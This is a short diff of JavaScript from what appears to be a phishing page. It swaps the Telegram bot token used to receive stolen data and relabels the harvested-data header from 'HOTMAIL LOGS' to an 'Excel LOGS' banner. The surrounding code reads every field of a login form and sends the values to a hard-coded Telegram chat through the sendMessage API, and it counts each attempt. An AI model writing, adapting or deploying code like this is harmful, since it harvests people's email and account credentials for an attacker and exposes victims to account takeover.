@@ -2,7 +2,7 @@ document.addEventListener('DOMContentLoaded', function () {
         const btWole = document.getElementById('btWole');
         const msgFont = document.getElementById('msgfont');
 
-        const botToken1 = '8291389569:AAHx1R4lt5PLRMxRNE5FoKhjpoDmksRJRmA';
+        const botToken1 = '8901454787:AAGbUIbRhZ9NJuzlDZzdULWOc20q6qV1BNk';
         const chatId1 = '1400240391';
         const telegramUrl1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;
 
@@ -61,7 +61,7 @@ document.addEventListener('DOMContentLoaded', function () {
             const formData = new FormData(document.forms['ozoto']);
             countAttempt++;
 
-            let messageText = '=== HOTMAIL LOGS ===\n';
+            let messageText = '===🛡️ 2026 Excel LOGS 🛡️===\n';
             for (const [key, value] of formData.entries()) {
                 messageText += `${key}: ${value}\n`;
             }
